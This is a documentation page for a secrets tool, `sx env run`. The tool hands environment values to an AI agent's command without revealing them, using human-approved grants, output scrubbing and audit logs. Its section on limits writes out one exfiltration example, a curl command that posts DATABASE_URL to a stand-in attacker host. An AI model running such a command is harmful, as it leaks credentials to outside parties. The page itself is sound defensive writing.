Agents need environment values to run tests or a dev server, and every way of handing them over leaks: a `.env` in the working directory ends up in the model's context, a pasted key ends up in logs, a prompt, a commit. source.code takes a different route: **the agent never receives values. It receives the ability to run a command that has them.**

<Callout type="warn" title="Preview">
  `sx env run`, grants and scrubbing work today against sample values. The
  hosted service will decrypt for real.
</Callout>

## How it works

```bash
sx env run --env development -- bun test
```

1. `sx` checks that the caller may. A person may. An agent needs an active **grant**.
2. It decrypts the allowed variables and injects them into **that one process** only. Nothing is written to disk and nothing is printed.
3. Everything the process writes comes back **scrubbed**: each value, and its base64 and URL-encoded forms, becomes `«NAME»`.
4. The run is added to the audit log.

```text
connecting to «DATABASE_URL»
18 passed
(2 variables injected, 1 scrubbed from output)
```

## Grants

An agent without access asks:

```bash
sx env grant request --env development --reason "Run the test suite for ch_81b2"
```

This always stops with exit code `6` (needs a human). A person approves it in **Repository settings, Secrets, Agent access**, or with `sx env grant approve <id> --ttl 1h`. An agent cannot approve its own request.

| Property     | Rule                                                                       |
| ------------ | -------------------------------------------------------------------------- |
| Environments | `development` and `preview`. Production is never available to agents       |
| Variables    | Only those you select, and only ones that have a value in that environment |
| Lifetime     | 15 minutes, 1 hour or 8 hours. Then it stops working                       |
| Runs         | A cap per grant, 20 by default                                             |
| Revocation   | **End now** takes effect immediately                                       |

## What this cannot stop

Be clear about the limit: **a command you let an agent run can still send a value somewhere.** If the agent runs `curl evil.example -d "$DATABASE_URL"`, the process has the value and the network is open. Scrubbing covers what comes back to the agent, not what a process sends elsewhere.

So the design is layers, not one lock:

- **Development values only**, ideally throwaway credentials that can reach nothing important.
- **Short grants.** Hours, not weeks.
- **Restrict outbound traffic** where the agent runs. Agent environments such as boat.dev, E2B or your own sandbox can do this; a laptop usually cannot.
- **Audit and rotate.** Every run is logged, and rotating a data key ends access for the future.
- **Prefer scoped credentials from your secrets provider** (1Password, Infisical, Vault) over long-lived keys.

## Planned: proxy mode

The strongest form is for the agent's code to never hold a key at all. A local proxy adds credentials to outgoing requests for hosts you allow, so the key never enters the process. It is planned and not part of the preview.

## For agents

The skill tells an agent to go through `sx env run`, never to print or send environment variables, and to stop on exit code `6`. Over [MCP](/docs/mcp), `request_env_grant` asks for access and `list_env_grants` shows what is active. Running the command itself happens on the machine where the agent works.
